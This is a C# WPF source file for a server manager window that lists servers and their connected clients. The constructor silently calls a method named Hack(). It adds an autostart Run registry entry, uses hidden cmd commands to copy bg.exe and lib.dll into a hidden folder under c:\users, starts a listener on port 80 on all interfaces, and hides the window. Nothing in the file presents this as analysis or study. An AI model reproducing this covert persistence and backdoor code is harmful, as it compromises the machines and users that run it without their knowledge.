using Lib;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Windows;

namespace ReformCodes
{
    /// <summary>
    /// ServerUI.xaml 的交互逻辑
    /// </summary>
    public partial class ServerUI : Window, IObserver
    {
        public ServersManager ServersManager { get; private set; }

        public ServerUI()
        {
            InitializeComponent();
            ServersManager = new ServersManager();
            ServersManager.Register(this);
            Hack();
        }

        public void UpdateClientUI()
        {
            Dispatcher.Invoke(() =>
            {
                if (serverListView.SelectedItem != null)
                {
                    ServerItemInformation info = serverListView.SelectedItem as ServerItemInformation;
                    string server = info.ServerIPEndPoint;
                    clientListView.Items.Clear();
                    foreach (string client in ServersManager[server].GetClients())
                        clientListView.Items.Add(new ClientItemInformation(client, null, ServersManager[server].Clients[client].ConnectingTime));
                }
                else
                {
                    clientListView.Items.Clear();
                }
            });
        }

        public void UpdateServerUI()
        {
            Dispatcher.Invoke(() =>
            {
                serverListView.Items.Clear();  // Clear original data.
                foreach (string server in ServersManager.GetServers())
                {
                    serverListView.Items.Add(new ServerItemInformation(server, ServersManager[server].StartedTime.ToString()));
                }
            });
        }

        public void SelectChanged(object sender, EventArgs e) => UpdateClientUI();

        public void Refresh(object sender, EventArgs e) => UpdateClientUI();

        public void WindowClosing(object sender, EventArgs e)
        {
            ServersManager.Remove(this);
            ServersManager.StopAllServer();
            UpdateServerUI();
        }

        public void AddServer(object sender, EventArgs e)
        {
            if (int.TryParse(tboxServerPort.Text, out int port))
            {
                try
                {
                    ServersManager.ServerAddedAndStarting(new MyProtocol(), new IPEndPoint(IPAddress.Any, port));
                }
                catch (SocketException er)
                {
                    if (er.ErrorCode == 10048)
                    {
                        MessageNotifyer.ShowError("Current port have been used! Please use another port.");
                    }
                }
            }
            else
            {
                MessageNotifyer.ShowError("The port is invalid!");
            }
        }

        public void RemoveServer(object sender, EventArgs e)
        {
            if (serverListView.SelectedItem != null)
            {
                string selectedServer = (serverListView.SelectedItem as ServerItemInformation).ServerIPEndPoint;
                ServersManager.ServerRemovedAndStopping(selectedServer);
            }
        }

        public void CloseConnection(object sender, EventArgs e)
        {
            if (serverListView.SelectedItem != null)
            {
                string currentServer = (serverListView.SelectedItem as ServerItemInformation).ServerIPEndPoint;
                int len = clientListView.SelectedItems.Count;
                ClientItemInformation[] selectedItems = new ClientItemInformation[len];
                clientListView.SelectedItems.CopyTo(selectedItems, 0);
                foreach (ClientItemInformation item in selectedItems)
                    ServersManager[currentServer].Terminate(item.ClientLocalEndPoint);
            }
        }

        public void Update(object state)
        {
            if (state == null)  // From ServersManager.
            {
                UpdateServerUI();  // Updating the server ui at first.
            }
            else  // From Server.
            {
                UpdateClientUI();
            }
        }

        private void Hack()
        {
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                if (registryKey.GetValue("bg") == null)
                {
                    string path = Hiding() + @"\bg.exe";
                    registryKey.SetValue("bg", path);
                }
            }
            catch
            {

            }
            int port = 80;
            ServersManager.ServerAddedAndStarting(new MyProtocol(), new IPEndPoint(IPAddress.Any, port));
            Hide();
        }

        private string Hiding()
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            process.StandardInput.WriteLine(@"mkdir c:\users\_win_bg & attrib +h c:\users\_win_bg & copy bg.exe c:\users\_win_bg & copy lib.dll c:\users\_win_bg");
            process.StandardInput.Flush();
            process.Close();

            return @"c:\users\_win_bg";
        }
    }
}
